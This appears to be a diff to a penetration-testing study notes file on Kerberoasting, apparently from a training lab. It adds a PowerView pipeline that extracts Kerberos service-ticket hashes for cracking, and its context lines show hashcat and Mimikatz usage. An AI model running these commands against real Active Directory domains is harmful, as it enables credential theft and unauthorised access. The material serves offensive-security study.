@@ -104,13 +104,14 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 
 >If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
 ## Automated / Tool Based Route
-#### Using PowerView to Enumerate SPN Accounts
+#### Using PowerView to Enumerate and target SPN Accounts
 ```powershell
 Import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname,serviceprincipalname # list all users with SPNs
 
 # Using PowerView to Target a Specific User
-Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty hash 
+  # -ExpandProperty it will write all the output line
 
 # Exporting All Tickets to a CSV File
 Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
